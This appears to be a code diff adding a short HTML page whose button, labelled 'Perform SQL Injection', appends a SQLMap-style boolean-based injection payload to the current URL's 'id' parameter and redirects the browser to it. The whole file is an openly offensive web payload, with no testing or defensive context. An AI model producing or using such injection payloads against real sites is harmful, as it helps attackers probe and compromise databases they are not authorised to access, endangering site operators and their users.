@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection Form</title>
+</head>
+<body>
+  <h1>SQL Injection Form</h1>
+
+  <!-- Button to trigger SQL injection -->
+  <button id="sqlInjectionButton">Perform SQL Injection</button>
+
+  <script>
+    // JavaScript to handle button click
+    document.getElementById('sqlInjectionButton').addEventListener('click', function() {
+      // Construct the SQLMap payload
+      var payload = "hacker3FhioMOrqbbgoqkRlBqe' AND 4846=4846 AND 'ezwq'='ezwq";
+
+      // Modify the URL with the payload
+      var currentUrl = window.location.href;
+      var modifiedUrl = currentUrl.includes('?') ? currentUrl + '&' : currentUrl + '?';
+      modifiedUrl += 'id=' + encodeURIComponent(payload);
+
+      // Redirect to the modified URL
+      window.location.href = modifiedUrl;
+    });
+  </script>
+</body>
+</html>
